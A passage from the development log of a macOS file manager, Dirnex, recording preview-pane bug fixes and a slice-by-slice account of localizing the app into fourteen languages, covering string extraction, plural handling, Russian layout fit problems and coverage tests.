  symptom of. `QLPreviewView` renders out of process: its container answers `hitTest` and then
  declines the event, so AppKit re-dispatched clicks and drags to the file tables underneath — the
  covered pane's cursor followed clicks on the photograph, and a drag copied a file across panes.
  The surface now returns `self` from `hitTest` and swallows the mouse handlers, exempting `PDFView`
  so a document still scrolls and zooms.
- **The pane divider stayed live under the preview.** `NSSplitView` keeps its drag region and its
  resize cursor whatever covers it, so the `< | >` cursor appeared over a photograph and dragging
  there resized panes nobody could see. `LockableDividerSplitViewController` empties the divider's
  effective rect while a preview covers it — the panes' divider for ⌃⇧Q, all three for ⌃⌥Q, which
  covers the whole content view.
- **The next file arrived from the side it had just left.** `completeSwipe` placed the incoming file
  at the opposite edge and then read `layer.presentation()` for the animation's start — but the
  presentation layer still showed the *exit* position, so every flip animated in from the wrong
  edge. Reads as inverted direction; is actually a one-frame lag. The start is now stated, not read.
- **…and an `NSImageView` defends its image's size at priority 750**, so an 8629 px panorama pushed
  the constraint chain outward and resized the *window* past the edge of the display, cutting off the
  function bar — while every frame inside the preview was provably correct. Its compression
  resistance and hugging are pinned to the floor; the surface is sized by its anchors alone.

### M12 — Localization (M)

Goal: the whole app speaks the user's language — every string it owns, not only the easy ones — with
English as the source and the machinery proven by a real translation rather than by a pseudolanguage.

Landed 2026-07-22 → 2026-07-29 in three passes: the plumbing, the extraction sweep that wrapped every
remaining literal, and the twelve further languages. **Fourteen languages ship** — English plus
Deutsch · Español · Français · Italiano · 日本語 · 한국어 · Nederlands · Polski · Português (Brasil) ·
Русский · Українська · 简体中文 · 繁體中文 — each with a complete `Localizable` column (802 keys,
plural variants included) and both App Shortcut phrases, enforced by `LocalizationCoverageTests`. No
RTL in the shipped set. Four of the fourteen are CJK, so the input-method behaviour of the inline
rename field and the palette is a live check none of the passes below records running.

**Pass 1 — plumbing (2026-07-22, landed).** Auto-selection from the system language, an in-app
override, and every string the *registry* owns translated end to end.

- `DirnexCore` gains `AppLanguage`/`AppLanguages` (shipped languages, endonyms, and the pure
  system-preference matching) and `LocalizationKey` (the key scheme). **The core still ships no
  resources**: its English `title`/`label`/`keywords` stay data and act as the fallback, so
  `swift test` remains hermetic and no catalog test asserts against translated output.
  `Command.id` is the translation key — which is what its doc comment already promised.
- The app owns `Localizable.xcstrings`. `LocalizedCatalog` joins the registry to it and is the only
  entry point the app uses, so every downstream `command.title` is translated without each display
  site having to remember. Translated palette keywords are **added** to the English ones.
- Language switching writes `AppleLanguages` into Dirnex's own defaults domain and relaunches —
  which carries AppKit's own strings and Sparkle's dialogs along with ours. Settings ▸ General has
  the picker and a "Relaunch" button; `.system` is the absence of a pin, so auto-selection is free.
- Hand-rolled `count == 1 ? … : …` plurals became catalog plural variants, two of them through
  `substitutions` (Russian needs one/few/many, and needs to reorder the sentence).
- The function bar carries full Russian verbs ("F5 Копировать", not "F5 Копия"): measured, they fit
  at the 640 pt window minimum, because `fillEqually` never squeezes a cell below its caption. A
  shortening fallback for narrow windows was built and then deleted as unreachable — the
  measurement should have come first.
- Verified live: menu bar, palette, function bar, Settings and the relaunch round trip, all in
  Russian, with the session restored intact across the restart. Three bugs only the live run found —
  the menu bar's titles were a second hardcoded copy of the category names, `Text("a" + "b")`
  silently bypasses localization, and a catalog entry left blank for English compiles to its own
  key. All in NOTES.md.

**Pass 2 — the extraction sweep (2026-07-23 → 07-24, thirteen slices, landed).** ~500–700 remaining
AppKit and SwiftUI literals wrapped file by file so Xcode extracts them, then Russian filled in. The
plan's lever for verifying it was Xcode's **pseudolanguages** — accented for literals that were never
wrapped, double-length for truncation in the function bar and column headers. In the event the lever
was a **live Russian run per slice**, and it earned its place: what it caught was almost always a
translation that did not *fit* — a field overrun (Slice 5), a clipped label column (6), a segmented
control crushed to «…» (8) — which no catalog check and no English screenshot can see. A lint rule
keeping bare literals out of UI files is still unwritten; the repeated sweeps in Slices 11–13 stand in
for it.

- **Slice 1 landed (2026-07-23): everything outside `Dirnex/Browser/`.** Settings (Panels /
  Operations / Shortcuts tabs, the window title, the shortcut recorder), the Conflict and Error
  dialogs, the shared `VFSErrorText` and load-failure sheet, the Full Disk Access onboarding sheets,
  the first-run tour chrome, and the palette placeholder — 79 app literals wrapped and translated.
  The tour's *screen copy* is `DirnexCore` data, so it got the command-registry treatment rather than
  `String(localized:)`: `LocalizationKey.tourTitle/tourBody` key it by `TourScreen.id`,
  `LocalizedCatalog.title/body(for:)` join it, and `LocalizationCoverageTests` now fails if a screen
  is untranslated (10 symbolic keys). Two traps from NOTES.md recurred and were fixed at the source:
  `Text(someStringVar)` / `"a" + "b"` (the `diffToolFooter` and editor-label computed properties),
  and verb-splicing (`"Couldn’t \(verb)…"` → two whole sentences). **`xcodebuild` does not write
  discovered strings back into the source `.xcstrings`** — only the Xcode IDE does — so the catalog
  entries were added from the compiler-emitted `.stringsdata` (exact keys) by hand.
- **Deferred within this slice:** the App Intents strings (`AutomationIntents.swift`,
  `DirnexOperationEntity.swift`) now *extract* but stay untranslated — they are their own pass (see
  below), and leaving them out changes nothing at runtime (the English key is the fallback).
- **Slice 2 landed (2026-07-23): the file-pane menu and operation surface.** The right-click menus,
  Open With, the wildcard Select/Unselect dialog, Compare-by-contents (its confirmations and
  failures), New Folder and create-file, the Trash — Empty Trash, Restore All / Put Back, and their
  failures — F4/⇧F4 Edit, the copy/move destination errors, and the titlebar Back/Forward buttons:
  90 new catalog keys across 10 files, all Russian-filled. Three NOTES.md traps recurred and were
  fixed at the source: verb-splicing (`"Couldn’t \(verb)…"` for the deletion failures → four whole
  sentences), the non-localizing `displayName + suffix` concatenation in Open With (→ a composed
  `"%@ (default)"` key), and a **name/count split** — the single-item confirmation names the file
  (`Move “%@” to the Trash?`) while the many-item one counts (`Move %lld items…`), so it is *not* a
  plain plural: the two branches are separate keys and only the count branch carries the Russian
  one/few/many. Keys were taken from the compiler-emitted `.stringsdata` and added by script,
  verified additive-only against the catalog with the multiline `\`-continuation strings checked
  verbatim against the emitted keys (swiftformat leaves the space before `\` intact — confirmed, not
  assumed).
- **Slice 3 landed (2026-07-23): the sidebar.** Every section, row, tooltip, context menu and alert
  in the source-list — Favorites, Searches, Servers, Tags, the Recents / iCloud / Trash system rows,
  the eject button and the disclosure triangles: 49 new catalog keys across 12 files, all
  Russian-filled. The one architectural piece: **the section header titles are `DirnexCore` data**
  (`SidebarSection.title`), so they got the tour-screen treatment rather than an app
  `String(localized:)` — `LocalizationKey.sidebarSection(_:)` keys them by the section's stable raw
  value (the same value the persisted collapse state keys off), `LocalizedCatalog.title(for:)` joins
  them, and `LocalizationCoverageTests` now fails on an untranslated section (8 symbolic keys).
  Wrapping `String(localized: section.title)` at the display site would have extracted *nothing* —
  the argument is a variable — which is the whole reason the registry treatment exists. Tooltips and
  the SF-Symbol `describedAs:`/`accessibilityDescription:` labels were localized too, so a Russian
  VoiceOver user doesn't hear "Eject" in an otherwise-translated UI. Two count strings in the tag
  surface were the only subtlety: the delete-tag confirmation's hand-rolled `count == 1 ? … : …`
  became a catalog plural variant (single `%lld`, Russian one/few/many), and the partial-failure
  sentence is a plain three-argument string (`%lld of %lld files. %@…`, no plural — "files" never
  varies there). Keys taken from the compiler-emitted `.stringsdata`, added by script, verified
  additive-only. Verified live in Russian: all eight section headers (Недавние · Поиски · Избранное ·
  Облако · Тома · Серверы · Корзина), the system rows, and the Trash and server context menus.
- **Slice 4 landed (2026-07-23): the pane chrome.** The always-visible browser furniture — the tab
  strip (New/Close tooltips and accessibility labels), the window-bottom queue bar and its per-job
  rows (Pause/Resume, Cancel all, the disclosure toggle, and the whole live status/detail readout),
  the copy/move batch-failure alert, the path-bar crumb "Copy Path" menu and the Trash / search
  virtual labels, the three real column headers (Name · Size · Date Modified) plus the Git-status and
  size-bar header tooltips, and the Git branch chip's tooltip: 44 new catalog keys across 10 files,
  all Russian-filled. The recurring traps, all fixed at the source: **verb-splicing** in three places
  (`"Copying \(name)"` / `"Moving \(name)"` in the queue header and rows, and `"Couldn’t \(verb)…"`
  in the batch-failure alert → whole sentences per branch), and **hand-rolled plurals** in the branch
  chip (`commit\(n==1 ? "" : "s")` → catalog `%lld commits to push` / `to pull`, Russian
  one/few/many) and in the alert (`Couldn’t copy/move %lld items`). The **column headers are data**
  read through `Column.title` — but the literals live *in* that computed property, so wrapping them
  there extracts fine (unlike `SidebarSection.title`, whose value reaches the display site as a
  variable and needed the registry treatment). Five keys were reused, already translated, rather than
  re-added (`Cancel`, `OK`, `Trash`, `Copy Path`, and the single-item `Couldn’t copy/move “%@”`).
  `GitBranchChipView.toolTip` moved from bare literals to `String(localized:)`, so its two unit tests
  (which asserted English while the app test target inherits the Russian pin) were rewritten to build
  the expected string from the same primitives — pinning order, the `·` join, and the singular/plural
  selection without pinning a language (docs/NOTES.md). Keys taken from the compiler-emitted
  `.stringsdata`, added by script with an exact-match guard, verified additive-only (44 added, 0
  changed). One structural cost: the `String(localized:)` wrapping pushed `QueueBarView` past the
  type-body-length ceiling, so `statusText`/`detailText` moved to a same-file extension. Verified live
  in Russian: the column headers (Имя · Размер · Дата изменения) render, truncating on column width
  exactly as the English would.
- **Slice 5 landed (2026-07-23): the connect-to-server dialog.** The whole modal — the title,
  subtitle and buttons, the protocol picker's field labels (Protocol / Address / Host / Share /
  User / Password / Port / Auth / Key file / Save as), the SFTP auth-mode labels and the
  instructional field placeholders, and every connect-failure and host-key-change string: 29 new
  catalog keys across 3 files (`ConnectServerForm`, `ConnectServerPrompt`, `PanelViewController+
  Connect`), all Russian-filled; `Cancel` and `Connect` reused. The **technical-example
  placeholders are deliberately left untranslated** — the `smb://host/share` template, the
  `nas.local` / `example.com` hosts, the `Media` share, the `22` port, the `~/.ssh/id_ed25519`
  path, and the `SFTP` / `SMB` acronyms — the same convention as `example.com` everywhere. Two
  NOTES.md traps recurred and were fixed at the source: the **`+`-concatenation trap** —
  `String(localized: "a " + "b")` is a runtime `String`, not a localization-value literal, so it
  extracts *nothing*, exactly the `Text("a" + "b")` failure (the permission-denied and known-hosts
  details were rewritten to single literals, the latter a `\`-continued `"""` block for width); and
  **noun-splicing** in the host-key body, where `keyLabel = keyType.isEmpty ? "key" : "\(keyType)
  key"` composes "key" vs "RSA key" as its own unit so the sentence stays one literal and Russian
  reorders `%@ key` → «ключ %@». The 13 field labels (Host / User / Password recur across the two
  protocol layouts) and the placeholders live in a private `ConnectText` helper — each a computed
  property with its literal *at* the `String(localized:)` call, so extraction works (unlike a
  variable argument) while the class body stays under the type-body ceiling and the shared labels
  dedupe to one key. Keys taken from the compiler-emitted `.stringsdata`, added by script, verified
  additive-only (29 added, 0 changed). Verified live in Russian, both SFTP and SMB layouts
  (Подключение к серверу · Хост · Аутентификация: Закрытый ключ / Пароль · Адрес · Ресурс · гость
  (оставьте пустым)); the dialog is reached from **Переход ▸ Подключиться к серверу**, Finder's ⌘K
  slot, not File. One thing only the live run caught: «Необязательно — сохранить в боковой панели»
  overran the 280 pt Save-as field, so it was shortened to «Необязательно — в боковой панели» — a
  translation's *fit* is a live check, not a catalog one.
- **Slice 6 landed (2026-07-23): the archive prompts.** The pack sheet (Alt+F5) — title, subtitle,
  the Name/Format labels, the archive-name placeholder, the format popup, and the overwrite
  confirmation — plus every add/delete/extract confirmation and failure across the archive-write
  surface: 28 new catalog keys across 5 files (`PanelViewController+ArchivePack` / `+ArchiveWrite` /
  `+ArchiveAdd` / `+ArchiveExtract` / `+NestedArchive`), all Russian-filled; `Cancel`, `Replace`,
  `Delete`, and the single-item `Couldn’t delete “%@”` (from Slice 2) reused. Two recurring traps,
  fixed at the source: the **name/count split** — pack/delete/replace/add each name the file in the
  single case (`Delete “%@” from “%@”?`) and count in the many case (`Delete %lld items from “%@”?`),
  so they are separate keys and only the count branch carries the Russian one/few/many (three of them
  a count-plus-name `substitutions` plural, `%#@items@` + `%2$@`); and the **`+`-concatenation trap**
  in the archive-replace body (`"a " + "b"` → one `\`-continued `"""` literal). The **format-popup
  names stay English** (`Zip`, `Tarball (gzip)`, `7-Zip`, `Tar`) — technical vocabulary, the same
  convention as the SFTP/SMB acronyms; they are `DirnexCore` data and translating them would need the
  registry treatment, deferred. Keys taken from the compiler-emitted `.stringsdata`, inserted by
  script at their sorted positions, verified additive-only (28 added, 0 changed). One fit issue only
  the live run caught: the pack sheet's fixed **48 pt label column clipped Russian «Формат:»** (the
  English "Format:" fit) — fixed by sizing the column to the wider of the two localized captions
  (`intrinsicContentSize`) rather than a magic width, the same class as Slice 5's Save-as overrun.
  Verified live in Russian: the pack sheet (single title «Упаковать «jmeter.log»», plural «Упаковать
  3 объекта», subtitle, both labels now fitting, the «Имя архива» placeholder), a successful pack, and
  the delete-from-archive confirmation («Удалить «%@» из «%@»?» · «Это перезапишет архив; действие
  нельзя отменить.»).
- **Slice 7 landed (2026-07-23): the Multi-Rename tool.** The whole ⇧F2 sheet — the name/extension
  mask fields and their hint placeholders, search & replace, the regex toggle, the case popup, the
  counter row, the token legend, the two preview column headers, the footer status and the confirm
  button — plus the batch failure alert: 26 new catalog keys across 2 files
  (`MultiRenameController`, `PanelViewController+MultiRename`), all Russian-filled; `Cancel` and
  `Rename` reused. Three recurring traps, fixed at the source: **hand-rolled plurals** became catalog
  plurals through `String(localized:)` interpolation — the conflict count (`count == 1 ? "conflict"
  : "conflicts"` → `%lld name conflicts`) and the confirm button (`renaming == 1 ? "Item" : "Items"`
  → `Rename %lld Items`), each Russian one/few/many; the **name/count split** in the failure alert
  (single case names the file `Couldn’t rename “%@”`, many case counts `Couldn’t rename %lld items`,
  only the count branch carrying the plural); and the **`+`-concatenation trap** in the token legend
  (`"a " + "b"` → one `\`-continued `"""` literal). Two deliberate non-translations: the **mask
  tokens** (`[N] [E] [C] [Y] [M] [D] [h] [n] [s]`) stay literal because they are the syntax the user
  types into the fields — the same convention as the SFTP/SMB acronyms — so only the words *around*
  them in the legend translate; and the status line `%lld of %lld will be renamed` stays a **plain
  two-argument string, not a plural**, because Russian expresses it with the impersonal neuter
  «Будет переименовано N из M», invariant across every count (the same reasoning that kept Slice 3's
  three-argument failure line out of a plural). Keys taken from the compiler-emitted `.stringsdata`,
  added by script with an **exact-match guard** — a mistyped curly quote aborts rather than creating a
  phantom entry — verified additive-only (26 added, 0 changed), the multi-space legend key checked
  verbatim against the emitted key. Verified live in Russian: the whole sheet (Маска имени ·
  Расширение · Найти · Заменить на · Регулярное выражение · Регистр: Исходный регистр · Счётчик:
  Начало/Шаг/Цифры · the token legend · Текущее имя/Новое имя), with every label fitting the fixed
  640 pt sheet, and both count strings live — the status «Будет переименовано 3 из 3» and the button
  plural «Переименовать 3 объекта» (correct *few* form for 3). The failure alerts were checked
  through the compiled `ru.lproj` (`.strings` + `.stringsdict`) rather than live, being awkward to
  provoke.
- **Slice 8 landed (2026-07-23): scripts, workspaces, and directory sync.** The whole
  script/workspace/sync surface — the scripts organizer sheet (name/run-mode/function-key/keywords/
  command fields, the argv-env help text), the **Scripts ▸** submenu and script-run failures, the
  displaced-function-key notice; the workspace organizer, the Workspaces popup, and the save/replace
  prompts; the Synchronize Directories sheet (direction/comparison controls, the diff table's action
  glyphs and per-row override menu, the status/error lines) and its menu action and delete
  confirmation: 74 new catalog keys across 9 files, all Russian-filled; `Cancel`, `Done`, `Name`,
  `OK`, `Replace`, `Scripts` reused. The recurring traps, all fixed at the source: the
  **`+`-concatenation trap** in two multi-sentence bodies (the scripts help text and the
  displaced-keys footer → single `\`-continued `"""` literals); **verb/noun-splicing** in the
  displaced-keys line, kept as *one* positional-arg frame (`• %@ — %@ now runs %@.`) so Russian
  reorders it, with the key label and the claimant (`a macOS shortcut` / `a Dirnex command` / a
  command title) translating as independent object noun phrases; the **name/count split** in the
  script-run and displaced-keys titles (single names the file, many counts — separate keys, only the
  count branch a plural); and three **catalog plurals** (`%lld conflicts skipped`, `%lld scripts no
  longer run…`, `Synchronizing will move %lld items to the Trash.`, Russian one/few/many). Two
  plain-string decisions matching earlier slices: the sync status `%lld to copy, %lld to delete`
  stays a two-count string (neither verb inflects), and the script exit line is `Exited with status
  %d.` — the exit code is an `Int32`, so the emitted specifier is `%d`, not `%lld` (taken verbatim
  from the `.stringsdata`, not assumed). Technical tokens stay literal, as ever: the `$@` / `$1` /
  `$DIRNEX_*` shell variables in the scripts help. One structural cost: localization pushed
  `UserScriptsOrganizerController` past **all three** SwiftLint ceilings at once — the
  view-construction methods moved to the same-file `private extension` (type-body), and the table
  data-source moved to a companion `UserScriptsOrganizerController+Table.swift` (file-length),
  widening `scripts`/`loadDetail` to internal (docs/NOTES.md file-splitting). Keys taken from the
  compiler-emitted `.stringsdata`, added by script with an exact-match guard, verified additive-only
  (74 added, 0 changed). **The live Russian run caught one fit bug, as every slice has:** the sync
  controls row overflowed — measured (`NSLog`, not eyeballed) at **1163 pt demanded in a 680 pt row**,
  which collapsed the direction segmented control to an unreadable «…». Fixed two ways: the hint's
  horizontal compression resistance was lowered so it (not the controls) yields — a language-agnostic
  structural fix — and the Russian direction labels were shortened to single words («Слева
  направо»→«Направо», «В обе стороны»→«Обе», «Справа налево»→«Налево»), bringing the controls to
  657 pt; re-measured to confirm. The scripts organizer and the Save-Workspace prompt were verified
  clean live; the run/notice failure alerts were checked through the compiled `ru.lproj`, being
  awkward to provoke.
- **Slice 9 landed (2026-07-23): the remaining Browser controllers.** The last bare status/tooltip
  strings across `Dirnex/Browser/` — the Find Files sheet (`SearchController`: field labels, the
  kind/size/date/scope popups, placeholders, Find/Cancel), the Save Search and Replace dialogs, the
  New Tag dialog and its colour popup, the tag menu (New Tag… / Remove All Tags) and tag-change
  failure, the Favorites ⌃D menu (No Pinned Folders / Add·Remove Current Folder / missing-favorite
  alert), the terminal-launch failure, the iCloud download sheet, the inline-rename validation and
  failure alerts, the search-results truncation alert, and the window-controller tooltips (Toggle
  Sidebar, hidden-files toggle, update indicator): **68 new catalog keys across 15 files**, all
  Russian-filled; ~19 keys reused (Cancel/OK/Save/Remove/Replace, the pre-existing `Replace “%@”?`,
  `Recents`, `Trash`, `Results for %@`, and several more). **Three `DirnexCore` data enums got the
  registry treatment** (like `SidebarSection`): `SearchKind`/`SearchAge`/`FinderTagColor` `.title`
  reach the popups through a variable, so `LocalizationKey.searchKind/searchAge/tagColor` key them
  (the last by a switch-derived stable token, not its `Int` raw value, so the catalog reads as colour
  names), `LocalizedCatalog.title(for:)` joins them, and `LocalizationCoverageTests` now fails on an
  untranslated kind/age/colour (18 symbolic keys). Recurring traps fixed at the source: the
  **`+`-concatenation trap** in the iCloud download body (`"a " + "b"` → one literal), and the New Tag
  dialog's `colour` popup built its titles from `color.title` (a variable) — the exact reason the
  registry treatment exists. **Two things only the live Russian run caught, both after a *second*,
  wider scan:** the first pattern-based sweep missed every **multi-line `NSMenuItem(title:` / menu
  constructor** (the Favorites and tag menu items sat bare), and the **Recents virtual tab leaked
  English** — its tab title read "Recents" and its path bar "Результаты для Recents", because a
  `.search`-backend listing borrows the "Results for %@" phrasing. Fixed by giving Recents the Trash's
  self-naming treatment: `pathSummary` stays a stable English identity (`ResultsPresentation
  .recentsIdentity`, never displayed), the tab title localizes, and `rebuildVirtualLabel` matches on
  the identity to draw "Недавние" with the sidebar's `clock` glyph — the same lesson as the Trash,
  that a *place you visit* must name itself rather than read as a search someone ran. The stock tag
  *names* in the ⌃T menu (Red/Orange/…) stay English on purpose — they are `FinderTag.systemTagName`
  data, a separate core concern, not the colour titles. Keys taken from the compiler-emitted
  `.stringsdata`, added by script with an exact-match guard, verified additive-only (68 added, 0
  changed). Verified live in Russian: the whole Find Files sheet with all four popups, the Favorites
  and tag menus, the New Tag dialog and its eight colour names (Без цвета · Серый · … · Оранжевый),
  and the Recents self-naming; the awkward-to-provoke alerts were checked through the compiled
  `ru.lproj`.
- **Slice 10 landed (2026-07-23): the undo/redo action labels — the last piece of Pass 2.** The
  "Undo Move" / "Redo Clear Selection" menu titles composed `"Undo \(label)"` from a `label` that is
  *data*, not an app literal: the file-op names ("Copy", "Move", "New Folder", "Rename", "Move to
  Trash") originate in `DirnexCore`'s `UndoJournal`, and the selection-gesture names ("Mark", "Select
  All", "Invert Selection", "Select Files", "Unselect Files", "Clear Selection", "Select Range") are
  authored in the app and passed *into* the core on a `SelectionChange`. The fix was **the registry
  treatment, made honest by a type change**: a new `DirnexCore` enum `UndoActionLabel` names the whole
  finite vocabulary (English `title` = fallback data, stable `rawValue` = the key), and `UndoRecord
  .label` / `SelectionChange.label` / `UndoEntry.label` went from `String` to it — so a mistyped label
  is now a compile error, not a silently-untranslated magic string, and one coverage test
  (`UndoActionLabel.allCases`, 12 symbolic keys) proves every label is translated. `LocalizationKey
  .undoActionLabel` keys it, `LocalizedCatalog.title(for:)` joins it, and the two `"Undo %@"` /
  `"Redo %@"` menu frames plus the two `"Undo %@ finished with issues"` alert frames and the idle
  "Undo"/"Redo" collapse became `String(localized:)` literals (six English-text keys; Russian splices
  the accusative noun that follows «Отменить/Повторить» — "Отменить копирование", "Отменить выделение").
  18 new catalog keys across 12 core+app files, all Russian-filled. Two things worth recording. **The
  label is persisted** (a file-op record survives relaunch, `UndoController`), so the clean-token
  `rawValue` changes the journal's on-disk form — which decodes-or-resets exactly as `UndoController`
  already documents ("fails to decode and starts empty — a one-time reset, never a crash"), verified,
  not assumed. And the four **frame keys are English-text keys, not covered by the coverage test**
  (which only checks symbolic registry keys), so their exact spelling was confirmed against the
  compiler-emitted `.stringsdata` (`Undo %@`, `Redo %@ finished with issues`, … — byte-identical, no
  `%1$@` positional drift that would have silently fallen back to English) and against the compiled
  `ru.lproj`. Keys added by script, verified additive-only (18 added, 0 changed). Verified live in
  Russian: Space-mark → **Правка ▸ «Отменить выделение»** with **«Повторить»** collapsed, then Cmd+Z →
  **«Отменить»** collapsed with **«Повторить выделение»** — all four states (active/idle × undo/redo)
  rendering the composed frame + translated label. The file-op labels share the identical display path
  (the same join, the same frame), so proving the selection path proves them without mutating the
  filesystem; their translations were checked through the compiled `ru.lproj`.
- **Slice 11 landed (2026-07-23): the strings that reach the screen through a *return value*.** An
  audit after Slice 10 — a full sweep of the app *and* the core for bare prose, cross-checked against
  the compiler-emitted `.stringsdata` — found Pass 2's sweeps had all shared one blind spot, and it
  cost seven surfaces. Every earlier scan looked for the **assignment** (`messageText =`, `title:`,
  `String(localized:`); these seven compose their text in a computed property or a function that
  *returns* `String`, with the assignment a file away. It is the `statusText()` lesson from Slice 9
  generalized: that one was fixed as an instance, not as a class. **50 new catalog keys across 20
  files**, all Russian-filled.
  - **The 30 `VFSError.unsupported` sentences were the bulk of it**, and the fix is structural rather
    than a wrapping pass: `PanelViewController+Errors` ended its switch with `case let
    .unsupported(message): return message`, so every one of them — 17 authored in `DirnexCore`, 13 in
    the app — went to the screen in English, under a translated alert title, at the exact moment
    something had failed. The payload changed from a free-form `String` to a new
    `VFSUnsupportedReason` enum (the `UndoActionLabel` move from Slice 10, applied to an error):
    English `sentence` = fallback data, stable `key` = the translation key, and — because six of the
    sentences take arguments — a `%@` `englishFormat` plus its `arguments`, spliced *after* the
    lookup so a translation can reorder them positionally. `LocalizationKey.vfsUnsupported` keys it,
    `LocalizedCatalog.sentence(for:)` joins it, and one coverage test over
    `VFSUnsupportedReason.allCases` (27 symbolic keys) proves every sentence is translated **and**
    that no translation dropped a placeholder — a lost `%@` swallows the file name the sentence was
    naming. `CaseIterable` can't be synthesized with associated values, so `allCases` is spelled out
    with placeholder arguments; the key doesn't depend on them.
  - **Three surfaces moved their *words* out of the core rather than getting keys**, because the core
    owned a presentation decision it had no business owning: `UpdateAvailability.tooltip` (the
    permanently visible titlebar indicator) → `BrowserWindowController.tooltip(for:)`;
    `GitBranch.displayName`'s `"detached HEAD"` → `GitBranchChipView`; and
    `SFTPTransportError.classify`'s empty-stderr fallback, which now returns `.failure("")` — the
    payload is the *server's* words, and the app supplies a localized stand-in when there are none,
    exactly as it already owned the wording for `.notFound` / `.permissionDenied`. This is the
    `SyncBadgeStyle` / `GitStatusStyle` split ("the core picks the state; this picks the pixels and
    the words") applied where it had been skipped. Three core tests asserting the tooltip's English
    moved to the app as `UpdateIndicatorTooltipTests`; the *state* they rested on was already covered
    in `UpdateAvailabilityTests`, so nothing was lost.
  - **The remaining four were ordinary wrapping** of return-value producers: the cloud sync badge's
    tooltip and VoiceOver label (`SyncBadgeStyle.label(for:)`, 7 strings, on every cloud row),
    `SMBMountError.errorDescription` (5), `CloudDownloadPrompt`'s `verdict`/`describe` (4), and
    `SFTPProcessTransport`'s two failures. Each literal sits *at* its `String(localized:)` call
    rather than being switched into one, or it extracts nothing.
  - Verified live in Russian, three of the seven end to end: a deliberately corrupt `.zip` produced
    «Не удалось прочитать архив «broken.zip».» (the whole chain — core enum → key → catalog → join →
    `VFSErrorText` — with the argument spliced), a detached-HEAD repo drew «отсоединённый HEAD» in the
    Git chip, and an evicted iCloud file's badge read «Не загружено — хранится в облаке». The four
    awkward-to-provoke ones (SMB, iCloud download, SFTP, the update indicator) were checked through
    the compiled `ru.lproj`, as earlier slices did. One probe was wrong before it was right, and is
    worth recording: `plutil -extract` reads a dotted key as a **keypath**, so it reported all 27
    `vfs.unsupported.*` keys MISSING from a bundle that had every one of them.
  - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
    additive-only check (50 added, 0 changed), and `Couldn’t mount the share (error %d).` was taken
    verbatim from it — the errno is an `Int32`, so the specifier is `%d`, not `%lld`.
- **Slice 12 landed (2026-07-24): the completeness audit, and the first *behavioural* leak.** A
  full re-run of Slice 11's sweep over the app and the core, cross-checked both ways against the
  compiler-emitted `.stringsdata` (extracted-but-uncatalogued *and* catalogued-but-unused), plus a
  scan for bare literals at AppKit display sinks. The catalog itself came back clean — 726 keys, `en`
  and `ru` complete, no blanks — and the extracted-but-untranslated set was **exactly** the 21 App
  Intents keys already deferred, so Slices 1–11 held. Six leaks remained; **6 new catalog keys**
  across 8 files. Three were confirmed on screen in a Russian build before being touched.
  - **The app menu was a third English** — `About Dirnex`, `Services`, `Hide Dirnex`, `Hide Others`,
    hand-built `NSMenuItem`s in the first menu of the app, sitting between fully translated registry
    items. The `MenuSpec` fix from Pass 1 covered the menu *bar's* titles; these are the standard
    app-menu items AppKit does not build for us, so nothing inherited them.
  - **Two sites had a translated key sitting right there and did not use it**: the Quick View header
    read "14 of 21" while `%@ of %@` was already translated for the queue bar, and the File menu drew
    `Compare with FileMerge…` while `Compare with %@…` was already translated for the Synchronize
    sheet — the *exact* instance NOTES.md records as a lesson, written down after Slice 8 and never
    actually fixed. The de-duplication lesson has this second half: after de-duplicating the string,
    check that every site producing it goes through the lookup.
  - **`SpotlightQuery.summary` was a presentation decision in the core**, so it went to the path bar
    and tab chip as English `"Search results"` or a raw `SearchKind.title`, bypassing the join the
    Find-Files popup itself uses. Fixed the Slice 11 way — by *deleting* the words, not keying them:
    the core now answers `SummaryTerm` (`.name`/`.content`/`.kind`/`.tag`/`.generic`), keeping the
    tested precedence, and `LocalizedCatalog.summary(of:)`/`.plainName(of:)` pick the words. The
    display quotes became a `“%@”` format so Russian can answer `«%@»`.
  - **`NSAlert`'s Escape binding is English-only, which made this the first leak that changed
    *behaviour* rather than pixels** — see NOTES.md for the probe and the two live bugs it turned up.
    `enableEscapeToCancel(safe:)` now takes an `NSApplication.ModalResponse` instead of matching
    titles, and `EscapeToDismissTests` pins it with cases carrying no English word anywhere.
  - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
    additive-only check (6 added, 0 changed); the placeholder guard had to learn that `%1$lld` and
    `%lld` are the same argument, since positional specifiers are exactly how a translation reorders.
  - **Known and left alone:** an ad-hoc search with no term of its own draws "Results for Search
    results" — a stutter that reads identically in English and predates this slice. Fixing it means
    giving the generic search a self-naming identity the way Recents and the Trash have one; it is a
    wording decision, not a translation gap.
- **Slice 13 landed (2026-07-24): the deferred automation surface, and one real miss.** The two
  standing deferrals (App Intents, archive formats) cleared, plus a leak neither audit had named;
  **30 new `Localizable` keys and a new `AppShortcuts.xcstrings`** across 8 files. What each was:
  - **The App Intents strings were extracted all along** — every `LocalizedStringResource` literal
    sits in `AutomationIntents.stringsdata`, so the deferral was never "the compiler can't see
    these", it was 21 keys nobody had put in the catalog. Titles, descriptions, category names,
    parameter titles and the two `Summary(…)` lines all took ordinary catalog entries with no code
    change.
  - **The App Shortcut *phrases* need their own catalog**, `AppShortcuts.xcstrings`, and the
    stringsdata says so: the extractor writes them into an `AppShortcuts` table while everything else
    goes to `Localizable`. The file-system-synchronized group picked the new catalog up with no
    `project.pbxproj` edit, and both `.lproj`s compiled an `AppShortcuts.strings`. A phrase has to
    keep `${applicationName}` in every language.
  - **`"\(Scripting.noWindowMessage)"` extracted the key `%@`.** Interpolating a plain `String` into
    an intent's `LocalizedStringResource` yields a format with no sentence in it, so the message was
    invisible to extraction *and* to every catalog sweep — it looked wrapped. `noWindowMessage` is now
    a `LocalizedStringResource` declared once and resolved through `String(localized:)` on the
    AppleScript side, so both doors share one extracted key.
  - **The AppleScript error messages are now translated too**, reversing Slice 12's call. The `.sdef`
    *terminology* genuinely must stay English — a script breaks if `reveal` is renamed — but an error
    message is prose read by a human in Script Editor, and translating it breaks nothing. The verb
    names stay verbatim *inside* the sentences («Команде reveal нужен POSIX-путь, например reveal
    "/Users/me".»). Vocabulary and prose are different things; only the first is load-bearing.
  - **The archive format names took the registry treatment**, like the search filters before them:
    `LocalizationKey.archiveFormat(_:)` keyed by the case's raw value, `LocalizedCatalog.title(for:)`
    at the popup, the core's `displayName` left in place as English fallback *data*. New coverage test,
    with the same one-word carve-out the command titles use — "Zip" and "7-Zip" are product names.
    Confirmed live in a Russian build: `Zip · Tar-архив (gzip) · Tar-архив (bzip2) · 7-Zip · Tar (без
